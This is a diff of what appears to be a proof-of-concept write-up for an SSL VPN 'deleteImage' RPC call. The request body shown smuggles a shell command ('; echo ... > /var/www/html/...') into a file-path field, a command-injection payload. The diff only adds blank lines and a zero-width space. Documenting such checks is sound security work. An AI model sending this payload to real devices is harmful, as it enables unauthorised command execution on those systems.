@@ -45,13 +45,21 @@ Accept-Encoding: gzip
 ```
 
 {
+
    "action": "SSLVPN_Resource",
+
    "method": "deleteImage",
+
    "data": [{
-       "data": ["/var/www/html/d.txt;echo '5b926437'>/var/www/html/5b926.txt"]
+
+​       "data": ["/var/www/html/d.txt;echo '5b926437'>/var/www/html/5b926.txt"]
+
    }],
+
    "type": "rpc",
+
    "tid": 17
+
 }
 
 ```
